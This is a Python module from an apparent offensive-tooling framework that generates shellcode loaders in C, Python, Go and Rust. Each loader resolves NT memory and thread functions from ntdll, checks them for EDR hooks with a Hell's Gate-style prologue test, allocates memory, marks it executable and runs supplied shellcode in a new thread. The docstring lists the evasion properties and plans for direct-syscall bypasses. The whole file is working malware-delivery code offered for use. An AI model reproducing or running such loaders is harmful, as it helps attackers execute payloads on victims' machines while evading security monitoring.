"""Loader: win_nt_alloc_thread — NT API direct call via ntdll + Hell's Gate stub verification.

Tier 3 (NT API layer).

Strategy:
  - Resolve NtAllocateVirtualMemory, NtProtectVirtualMemory, NtCreateThreadEx,
    NtWaitForSingleObject directly from ntdll.dll via GetProcAddress.
  - Verify each export's first 4 bytes match the unhooked syscall prologue
    (4C 8B D1 B8 = "mov r10,rcx; mov eax,<ssn>"). If any function is hooked,
    report and abort rather than silently running through the hook.
  - Call the NT functions directly, bypassing the kernel32/Win32 wrapper layer
    entirely. No VirtualAlloc, CreateThread, or WaitForSingleObject in the
    import trace.

Evasion properties:
  - No kernel32 APIs for memory or thread operations
  - IAT shows ntdll imports only (more opaque to shallow import-table scans)
  - Direct ntdll call is the syscall instruction on unhooked systems
  - Stub verification fails fast if EDR hooks ntdll (rather than silently
    running through the hook)

Still triggers on:
  - NtCreateThreadEx from non-image-backed memory (kernel callback)
  - If ntdll is hooked: falls back to None / error path, not bypass

Future tier (win_hells_gate or win_fresh_ntdll):
  - Full SSN extraction + direct syscall stub bypasses ntdll hooks
  - Fresh ntdll mapping from disk bypasses in-memory hook patches
"""
from __future__ import annotations

from . import _render

_render.self_register(__name__, "win_nt_alloc_thread")

_C_TEMPLATE = """\
#include <windows.h>
#include <stdio.h>
#include <string.h>

{sc_array}

typedef LONG NTSTATUS;
#define NT_SUCCESS(s) ((s) >= 0)

typedef NTSTATUS (NTAPI *FnNtAllocVM)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (NTAPI *FnNtProtVM)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS (NTAPI *FnNtCreateThreadEx)(PHANDLE, ACCESS_MASK, PVOID, HANDLE,
    PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
typedef NTSTATUS (NTAPI *FnNtWaitForSingleObject)(HANDLE, BOOLEAN, PVOID);

/* Hell's Gate: verify syscall prologue is unhooked (4C 8B D1 B8).
   Returns the function pointer on success, NULL if patched by EDR. */
static FARPROC check_stub(HMODULE ntdll, const char *name) {{
    BYTE *fn = (BYTE *)GetProcAddress(ntdll, name);
    if (!fn) {{ fprintf(stderr, "[-] GetProcAddress(%s) failed\\n", name); return NULL; }}
    if (fn[0] != 0x4C || fn[1] != 0x8B || fn[2] != 0xD1 || fn[3] != 0xB8) {{
        fprintf(stderr, "[-] %s appears hooked (bytes: %02X %02X %02X %02X)\\n",
                name, fn[0], fn[1], fn[2], fn[3]);
        return NULL;
    }}
    return (FARPROC)fn;
}}

int main(void) {{
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) {{ fprintf(stderr, "[-] ntdll not found\\n"); return 1; }}

    FnNtAllocVM              NtAllocVM  = (FnNtAllocVM)             check_stub(ntdll, "NtAllocateVirtualMemory");
    FnNtProtVM               NtProtVM   = (FnNtProtVM)              check_stub(ntdll, "NtProtectVirtualMemory");
    FnNtCreateThreadEx       NtThd      = (FnNtCreateThreadEx)      check_stub(ntdll, "NtCreateThreadEx");
    FnNtWaitForSingleObject  NtWait     = (FnNtWaitForSingleObject) check_stub(ntdll, "NtWaitForSingleObject");

    if (!NtAllocVM || !NtProtVM || !NtThd || !NtWait) return 1;

    /* NtAllocateVirtualMemory — allocate RW payload buffer */
    PVOID mem = NULL;
    SIZE_T sz = sc_len;
    NTSTATUS s = NtAllocVM((HANDLE)-1, &mem, 0, &sz,
                            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(s) || !mem) {{
        fprintf(stderr, "[-] NtAllocateVirtualMemory: 0x%lx\\n", s);
        return 1;
    }}

    memcpy(mem, sc, sc_len);

    /* NtProtectVirtualMemory — flip to RX */
    ULONG old = 0;
    sz = sc_len;
    s = NtProtVM((HANDLE)-1, &mem, &sz, PAGE_EXECUTE_READ, &old);
    if (!NT_SUCCESS(s)) {{
        fprintf(stderr, "[-] NtProtectVirtualMemory: 0x%lx\\n", s);
        return 1;
    }}

    /* NtCreateThreadEx — execute */
    HANDLE hThread = NULL;
    s = NtThd(&hThread,
               0x1FFFFF,    /* THREAD_ALL_ACCESS */
               NULL,        /* ObjectAttributes */
               (HANDLE)-1, /* ProcessHandle = self */
               mem,         /* StartRoutine */
               NULL,        /* Argument */
               0,           /* CreateFlags */
               0, 0, 0,     /* ZeroBits, StackSizes */
               NULL);       /* AttributeList */
    if (!NT_SUCCESS(s) || !hThread) {{
        fprintf(stderr, "[-] NtCreateThreadEx: 0x%lx\\n", s);
        return 1;
    }}

    NtWait(hThread, FALSE, NULL);
    CloseHandle(hThread);
    return 0;
}}
"""

_PY_TEMPLATE = """\
import ctypes
import ctypes.wintypes
import sys

{sc_bytes}

# Resolve NT functions from ntdll directly, bypassing kernel32 wrapper layer.
# ctypes.windll.ntdll calls the ntdll export directly — no CreateThread,
# VirtualAlloc, or VirtualProtect in the Win32 call path.
ntdll = ctypes.windll.ntdll

NTSTATUS = ctypes.c_long

def check_stub(name):
    fn = getattr(ntdll, name, None)
    if fn is None:
        print(f"[-] {{name}} not found in ntdll", file=sys.stderr)
        return None
    # Read first 4 bytes from the function's address to verify prologue
    addr = ctypes.cast(fn, ctypes.c_void_p).value
    hdr = (ctypes.c_ubyte * 4).from_address(addr)
    if list(hdr) != [0x4C, 0x8B, 0xD1, 0xB8]:
        print(f"[-] {{name}} appears hooked: {{bytes(hdr).hex()}}", file=sys.stderr)
        return None
    return fn

NtAllocVM  = check_stub("NtAllocateVirtualMemory")
NtProtVM   = check_stub("NtProtectVirtualMemory")
NtThd      = check_stub("NtCreateThreadEx")
NtWait     = check_stub("NtWaitForSingleObject")

if not all([NtAllocVM, NtProtVM, NtThd, NtWait]):
    sys.exit(1)

# NtAllocateVirtualMemory
mem    = ctypes.c_void_p(0)
sz     = ctypes.c_size_t(len(sc))
status = NtAllocVM(ctypes.c_void_p(-1), ctypes.byref(mem), 0, ctypes.byref(sz),
                   0x3000,   # MEM_COMMIT | MEM_RESERVE
                   0x04)     # PAGE_READWRITE
if status < 0 or not mem.value:
    print(f"[-] NtAllocateVirtualMemory: 0x{{status & 0xFFFFFFFF:08x}}", file=sys.stderr)
    sys.exit(1)

buf = (ctypes.c_char * len(sc)).from_buffer_copy(sc)
ctypes.windll.kernel32.RtlMoveMemory(mem, buf, len(sc))

# NtProtectVirtualMemory
old = ctypes.c_ulong(0)
sz  = ctypes.c_size_t(len(sc))
status = NtProtVM(ctypes.c_void_p(-1), ctypes.byref(mem), ctypes.byref(sz),
                  0x20,     # PAGE_EXECUTE_READ
                  ctypes.byref(old))
if status < 0:
    print(f"[-] NtProtectVirtualMemory: 0x{{status & 0xFFFFFFFF:08x}}", file=sys.stderr)
    sys.exit(1)

# NtCreateThreadEx
hThread = ctypes.c_void_p(0)
status  = NtThd(ctypes.byref(hThread),
                0x1FFFFF,         # THREAD_ALL_ACCESS
                None,             # ObjectAttributes
                ctypes.c_void_p(-1),  # ProcessHandle = self
                mem,              # StartRoutine
                None,             # Argument
                0, 0, 0, 0,       # Flags, ZeroBits, StackSizes
                None)             # AttributeList
if status < 0 or not hThread.value:
    print(f"[-] NtCreateThreadEx: 0x{{status & 0xFFFFFFFF:08x}}", file=sys.stderr)
    sys.exit(1)

NtWait(hThread, False, None)
"""


_GO_TEMPLATE = """\
package main

import (
\t"syscall"
\t"unsafe"
)

{sc_bytes}

func checkStub(addr uintptr) bool {{
\tif addr == 0 {{
\t\treturn false
\t}}
\tb := (*[4]byte)(unsafe.Pointer(addr))
\treturn b[0] == 0x4C && b[1] == 0x8B && b[2] == 0xD1 && b[3] == 0xB8
}}

func main() {{
\tntdll    := syscall.NewLazyDLL("ntdll.dll")
\tk32      := syscall.NewLazyDLL("kernel32.dll")
\tpClose   := k32.NewProc("CloseHandle")
\tpRtlMove := k32.NewProc("RtlMoveMemory")

\tpAlloc := ntdll.NewProc("NtAllocateVirtualMemory")
\tpProt  := ntdll.NewProc("NtProtectVirtualMemory")
\tpThd   := ntdll.NewProc("NtCreateThreadEx")
\tpWait  := ntdll.NewProc("NtWaitForSingleObject")

\tfor _, p := range []*syscall.LazyProc{{pAlloc, pProt, pThd, pWait}} {{
\t\tif err := p.Find(); err != nil {{ return }}
\t\tif !checkStub(p.Addr()) {{ return }}
\t}}

\tNtAllocVM := pAlloc.Addr()
\tNtProtVM  := pProt.Addr()
\tNtThd     := pThd.Addr()
\tNtWait    := pWait.Addr()

\tvar mem uintptr
\tsz := uintptr(len(sc))
\ts, _, _ := syscall.SyscallN(NtAllocVM,
\t\t^uintptr(0), uintptr(unsafe.Pointer(&mem)), 0,
\t\tuintptr(unsafe.Pointer(&sz)), 0x3000, 0x04)
\tif int32(s) < 0 || mem == 0 {{
\t\treturn
\t}}
\tpRtlMove.Call(mem, uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)))

\tvar old uint32
\tsz = uintptr(len(sc))
\ts, _, _ = syscall.SyscallN(NtProtVM,
\t\t^uintptr(0), uintptr(unsafe.Pointer(&mem)),
\t\tuintptr(unsafe.Pointer(&sz)), 0x20, uintptr(unsafe.Pointer(&old)))
\tif int32(s) < 0 {{
\t\treturn
\t}}

\tvar ht uintptr
\ts, _, _ = syscall.SyscallN(NtThd,
\t\tuintptr(unsafe.Pointer(&ht)), 0x1FFFFF, 0, ^uintptr(0),
\t\tmem, 0, 0, 0, 0, 0, 0)
\tif int32(s) < 0 || ht == 0 {{
\t\treturn
\t}}

\tsyscall.SyscallN(NtWait, ht, 0, 0)
\tpClose.Call(ht)
}}
"""

_RS_TEMPLATE = """\
#![allow(non_snake_case)]
use std::{{mem, ptr}};

type NTSTATUS = i32;
type FnNtAllocVM        = unsafe extern "system" fn(*mut u8, *mut *mut u8, usize, *mut usize, u32, u32) -> NTSTATUS;
type FnNtProtVM         = unsafe extern "system" fn(*mut u8, *mut *mut u8, *mut usize, u32, *mut u32) -> NTSTATUS;
type FnNtCreateThreadEx = unsafe extern "system" fn(*mut *mut u8, u32, *mut u8, *mut u8, *mut u8, *mut u8, u32, usize, usize, usize, *mut u8) -> NTSTATUS;
type FnNtWait           = unsafe extern "system" fn(*mut u8, i32, *mut u8) -> NTSTATUS;

#[link(name = "kernel32")]
extern "system" {{
    fn GetModuleHandleA(lpModuleName: *const u8) -> *mut u8;
    fn GetProcAddress(hModule: *mut u8, lpProcName: *const u8) -> *mut u8;
    fn CloseHandle(hObject: *mut u8) -> i32;
    fn RtlMoveMemory(dest: *mut u8, src: *const u8, len: usize);
}}

fn check_stub(addr: *mut u8) -> bool {{
    if addr.is_null() {{ return false; }}
    let b = unsafe {{ std::slice::from_raw_parts(addr, 4) }};
    b[0] == 0x4C && b[1] == 0x8B && b[2] == 0xD1 && b[3] == 0xB8
}}

fn main() {{
    {sc_bytes}
    unsafe {{
        let ntdll = GetModuleHandleA(b"ntdll.dll\\0".as_ptr());
        if ntdll.is_null() {{ return; }}

        let fa = GetProcAddress(ntdll, b"NtAllocateVirtualMemory\\0".as_ptr());
        let fp = GetProcAddress(ntdll, b"NtProtectVirtualMemory\\0".as_ptr());
        let ft = GetProcAddress(ntdll, b"NtCreateThreadEx\\0".as_ptr());
        let fw = GetProcAddress(ntdll, b"NtWaitForSingleObject\\0".as_ptr());
        if !check_stub(fa) || !check_stub(fp) || !check_stub(ft) || !check_stub(fw) {{ return; }}

        let NtAllocVM: FnNtAllocVM        = mem::transmute(fa);
        let NtProtVM:  FnNtProtVM         = mem::transmute(fp);
        let NtThd:     FnNtCreateThreadEx = mem::transmute(ft);
        let NtWait:    FnNtWait           = mem::transmute(fw);

        let proc = (!0usize) as *mut u8;
        let mut p: *mut u8 = ptr::null_mut();
        let mut sz: usize = sc.len();
        let s = NtAllocVM(proc, &mut p, 0, &mut sz, 0x3000, 0x04);
        if s < 0 || p.is_null() {{ return; }}

        RtlMoveMemory(p, sc.as_ptr(), sc.len());

        let mut old: u32 = 0;
        let mut sz2: usize = sc.len();
        if NtProtVM(proc, &mut p, &mut sz2, 0x20, &mut old) < 0 {{ return; }}

        let mut ht: *mut u8 = ptr::null_mut();
        let s = NtThd(&mut ht, 0x1FFFFF, ptr::null_mut(), proc,
                      p, ptr::null_mut(), 0, 0, 0, 0, ptr::null_mut());
        if s < 0 || ht.is_null() {{ return; }}

        NtWait(ht, 0, ptr::null_mut());
        CloseHandle(ht);
    }}
}}
"""


def generate_c(shellcode: bytes) -> str:
    """Return a C loader using NtAllocateVirtualMemory + NtCreateThreadEx via ntdll direct call."""
    return _C_TEMPLATE.format(sc_array=_render.c_array_literal(shellcode, "sc"))


def generate_python(shellcode: bytes) -> str:
    """Return a Python ctypes loader using ntdll NT functions directly."""
    return _PY_TEMPLATE.format(sc_bytes=_render.python_bytes_literal(shellcode, "sc"))


def generate_go(shellcode: bytes) -> str:
    """Return a Go loader using NtAllocateVirtualMemory + NtCreateThreadEx with stub check."""
    return _GO_TEMPLATE.format(sc_bytes=_render.go_bytes_literal(shellcode, "sc"))


def generate_rust(shellcode: bytes) -> str:
    """Return a Rust loader using NtAllocateVirtualMemory + NtCreateThreadEx with stub check."""
    return _RS_TEMPLATE.format(sc_bytes=_render.rust_bytes_literal(shellcode, "sc"))
